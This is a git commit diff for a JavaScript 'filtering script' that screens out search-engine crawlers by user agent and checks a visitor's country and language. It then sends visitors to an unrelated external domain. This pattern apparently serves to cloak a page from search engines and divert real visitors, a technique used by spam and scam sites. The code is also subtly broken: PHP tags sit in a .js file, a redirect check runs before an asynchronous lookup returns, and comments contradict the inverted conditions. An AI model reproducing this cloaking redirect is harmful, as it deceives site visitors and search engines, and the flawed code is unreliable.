20863207bf1d19e23976a3f025c9493feced9739
blogs4 <130796590+blogs4@users.noreply.github.com>
2023-04-15 01:01:28 +0200

    Update filtering-script.js

--- filtering-script.js
+++ filtering-script.js
@@ -1,40 +1,52 @@
 // Get user's IP address
-const ip_address = window.location.hostname;
+const ip_address = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";
 
 // Define array of bot user agents to filter out
 const bot_user_agents = ['Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot'];
 
 // Define array of allowed countries
-const allowed_countries = ['PL'];
+const allowed_countries = ['US', 'CA', 'GB', 'AU'];
 
 // Define array of allowed languages
-const allowed_languages = ['en', 'pl'];
+const allowed_languages = ['en', 'es', 'fr', 'de'];
 
 // Get user agent string
-const user_agent = navigator.userAgent;
+const user_agent = "<?php echo $_SERVER['HTTP_USER_AGENT']; ?>";
 
 // Get user's country code based on IP address
+let country_code = '';
 fetch(`http://ip-api.com/json/${ip_address}?fields=status,message,countryCode`)
-    .then(response => response.json())
-    .then(data => {
-        const country_code = data.countryCode;
+  .then(response => response.json())
+  .then(data => country_code = data.countryCode);
 
-        // Check if user's country is allowed
-        const country_allowed = data.status === 'success' && allowed_countries.includes(country_code);
+// Get user's language based on browser settings
+const language = navigator.language.substring(0, 2);
 
-        // Check if user's language is allowed
-        const language = navigator.language.slice(0, 2);
-        const language_allowed = allowed_languages.includes(language);
+// Check if user agent is a bot
+let is_bot = false;
+for (const bot_user_agent of bot_user_agents) {
+  if (user_agent.includes(bot_user_agent)) {
+    is_bot = true;
+    break;
+  }
+}
 
-        // Check if user agent is a bot
-        const is_bot = bot_user_agents.some(bot_user_agent => user_agent.includes(bot_user_agent));
+// Check if user's country is allowed
+let country_allowed = false;
+if (allowed_countries.includes(country_code)) {
+  country_allowed = true;
+}
 
-        // If any filter fails, redirect user to error page
-        if (is_bot || !country_allowed || !language_allowed) {
-            window.location.href = 'error.php';
-        }
-    })
-    .catch(error => console.error(error));
+// Check if user's language is allowed
+let language_allowed = false;
+if (allowed_languages.includes(language)) {
+  language_allowed = true;
+}
 
-// If all filters pass, continue with normal page content
-console.log('Welcome to our website!');
+// If all filters passes, redirect user to error page
+if (!is_bot && !country_allowed && !language_allowed) {
+  window.location.href = 'https://l106-co.idealica-lat.com/';
+}
+
+// If any filter fail, continue with normal page content
+console.log("Welcome to our website!");
